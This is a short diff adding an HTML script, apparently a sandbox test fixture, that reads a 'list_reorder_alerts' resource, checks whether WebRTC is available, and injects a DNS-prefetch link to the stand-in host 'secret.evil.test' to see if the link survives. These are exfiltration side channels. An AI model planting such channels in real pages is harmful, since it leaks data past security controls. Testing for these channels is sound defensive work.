@@ -1,0 +1,10 @@
+<script>
+window.__out = {};
+(async () => {
+  await vijaya.read('list_reorder_alerts', {});
+  window.__out.rtc = typeof RTCPeerConnection;
+  const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = '//secret.evil.test'; document.head.appendChild(l);
+  await new Promise((r) => setTimeout(r, 50));
+  window.__out.linkStillThere = !!document.querySelector('link');
+})();
+</script>
